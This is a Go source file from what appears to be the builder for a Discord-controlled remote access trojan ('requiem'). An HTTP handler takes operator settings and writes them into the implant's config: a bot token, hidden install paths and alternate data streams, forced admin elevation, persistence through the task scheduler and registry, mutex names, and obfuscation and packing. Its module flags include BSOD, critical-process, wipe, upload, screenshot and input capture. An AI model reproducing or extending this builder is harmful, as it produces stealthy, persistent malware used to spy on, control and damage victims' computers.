package routes

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"shared/higher"

	"builder/store"
	"builder/utils"

	"shared"
)

const (
	_CRYPTO_KEY_LEN int = 32
	_MUTEX_NAME_LEN int = 9
	_LAUNCH_KEY_LEN int = 12
)

type configBody struct {
	Tag string `json:"tag"`

	BotToken      string `json:"bot_token"`
	ServerID      string `json:"server_id"`
	CategoryID    string `json:"category_id"`
	CommandPrefix string `json:"command_prefix"`
	TrackingID    string `json:"tracking_id"`

	UseCustomDirectory        bool   `json:"use_custom_directory"`
	CustomDirectory           string `json:"custom_directory_path"`
	RandomizeDirecory         bool   `json:"randomize_directory"`
	UseCustomName             bool   `json:"use_custom_name"`
	CustomName                string `json:"custom_name"`
	RandomizeName             bool   `json:"randomize_name"`
	UseAlterateDataStream     bool   `json:"use_alternate_data_stream"`
	CustomAlternateDataStream string `json:"custom_alternate_data_stream"`
	PutInRegistry             bool   `json:"put_in_registry"`

	RequireAdmin         bool   `json:"require_admin"`
	PromptAdmin          bool   `json:"prompt_admin"`
	ForceAdmin           bool   `json:"force_admin"`
	ContinueWithoutAdmin bool   `json:"continue_without_admin"`
	ConnectBotMaxRetries string `json:"connect_bot_max_retries"`
	ConnectBotRetryDelay string `json:"connect_bot_retry_delay"`
	ExitIfCantConnect    bool   `json:"exit_if_cannot_connect"`

	PersistenceName string `json:"persistence_name"`
	TaskSchedular   bool   `json:"task_schedular"`
	Registry        bool   `json:"registry"`

	Audio      bool `json:"audio"`
	Brightness bool `json:"brightness"`
	Bsod       bool `json:"bsod"`
	Critical   bool `json:"critical"`
	Download   bool `json:"download"`
	File       bool `json:"file"`
	Input      bool `json:"input"`
	Jumpscare  bool `json:"jumpscare"`
	Macro      bool `json:"macro"`
	Msgbox     bool `json:"msgbox"`
	Persist    bool `json:"persist"`
	Ping       bool `json:"ping"`
	Process    bool `json:"process"`
	Rotate     bool `json:"rotate"`
	Run        bool `json:"run"`
	Ss         bool `json:"ss"`
	Settings   bool `json:"settings"`
	Site       bool `json:"site"`
	Tree       bool `json:"tree"`
	Tts        bool `json:"tts"`
	Uac        bool `json:"uac"`
	Update     bool `json:"update"`
	Upload     bool `json:"upload"`
	Volume     bool `json:"volume"`
	Wallpaper  bool `json:"wallpaper"`
	Wipe       bool `json:"wipe"`

	ObfuscateBuild bool `json:"obfuscate_build"`
	PackBuild      bool `json:"pack_build"`
}

func updateConfig() {
	http.HandleFunc("/api/update-config", func(write http.ResponseWriter, req *http.Request) {
		config := filepath.Join(store.Main, "store", "config.go")

		if store.DEBUG {
			fmt.Println("requiem config - " + config)
		}

		var rawBody map[string]any

		err := json.NewDecoder(req.Body).Decode(&rawBody)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to decode body - %v", err), http.StatusInternalServerError)
			return
		}

		decryptedBody := make(map[string]json.RawMessage)

		if store.SharedSecret != nil {
			for k, v := range rawBody {
				decrypted, err := shared.DecryptData(v.(string), store.SharedSecret, false)
				if err != nil {
					http.Error(write, fmt.Sprintf("failed to decrypt %s - %v", k, err), http.StatusBadRequest)
					return
				}

				decryptedBody[k] = json.RawMessage(decrypted)
			}
		} else {
			for k, v := range rawBody {
				value, err := json.Marshal(v)
				if err != nil {
					http.Error(write, fmt.Sprintf("failed to marshal %s - %v", k, err), http.StatusBadRequest)
					return
				}

				decryptedBody[k] = value
			}
		}

		marshalledBody, err := json.Marshal(decryptedBody)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to encode body - %v", err), http.StatusBadRequest)
			return
		}

		var body configBody

		err = json.Unmarshal(marshalledBody, &body)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to decode body - %v", err), http.StatusBadRequest)
			return
		}

		err = json.Unmarshal(marshalledBody, &body)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to decode body - %v", err), http.StatusBadRequest)
			return
		}

		data, err := os.ReadFile(config)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to read file - %v", err), http.StatusInternalServerError)
			return
		}

		content := string(data)

		cryptKey1 := utils.GenString(_CRYPTO_KEY_LEN)
		cryptKey2 := utils.GenString(_CRYPTO_KEY_LEN)
		cryptKey := higher.InitKey(cryptKey1, cryptKey2)

		if store.DEBUG {
			fmt.Printf("crypto key - %x\n", cryptKey)
		}

		store.Obfuscate = body.ObfuscateBuild
		store.Pack = body.PackBuild

		utils.ReplaceString(&content, "LAUNCH_KEY", utils.GenString(_LAUNCH_KEY_LEN))
		utils.ReplaceString(&content, "MUTEX_NAME", utils.GenString(_MUTEX_NAME_LEN))
		utils.ReplaceString(&content, "CRYPTO_KEY_1", cryptKey1)
		utils.ReplaceString(&content, "CRYPTO_KEY_2", cryptKey2)

		utils.ReplaceString(&content, "BOT_TOKEN", higher.EncryptConfig(body.BotToken))
		utils.ReplaceString(&content, "SERVER_ID", higher.EncryptConfig(body.ServerID))
		utils.ReplaceString(&content, "CATEGORY_ID", higher.EncryptConfig(body.CategoryID))
		utils.ReplaceString(&content, "COMMAND_PREFIX", body.CommandPrefix)
		utils.ReplaceString(&content, "TRACKING_ID", higher.EncryptConfig(body.TrackingID))

		utils.ReplaceBool(&content, "USE_CUSTOM_NAME", body.UseCustomName)
		utils.ReplaceString(&content, "CUSTOM_NAME", higher.EncryptConfig(body.CustomName))
		utils.ReplaceBool(&content, "USE_CUSTOM_DIR", body.UseCustomDirectory)
		utils.ReplaceString(&content, "CUSTOM_DIR", higher.EncryptConfig(body.CustomDirectory))

		utils.ReplaceBool(&content, "REQUIRE_ADMIN", body.RequireAdmin)
		utils.ReplaceBool(&content, "PROMPT_ADMIN", body.PromptAdmin)
		utils.ReplaceBool(&content, "FORCE_ADMIN", body.ForceAdmin)
		utils.ReplaceBool(&content, "CONTINUE_WITHOUT_ADMIN", body.ContinueWithoutAdmin)
		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_MAX_RETRIES", body.ConnectBotMaxRetries)
		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_DELAY", body.ConnectBotRetryDelay)
		utils.ReplaceBool(&content, "EXIT_IF_CANT_CONNECT", body.ExitIfCantConnect)

		utils.ReplaceString(&content, "PERSISTENCE_NAME", higher.EncryptConfig(body.PersistenceName))
		utils.ReplaceBool(&content, "TASK_SCHEDULAR", body.TaskSchedular)
		utils.ReplaceBool(&content, "AUTO_RUN_REG", body.Registry)

		err = os.WriteFile(config, []byte(content), 0666)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to write config - %v", err), http.StatusInternalServerError)
			return
		}

		store.Tag = body.Tag

		// todo: update modules thing

		write.WriteHeader(http.StatusOK)
	})
}
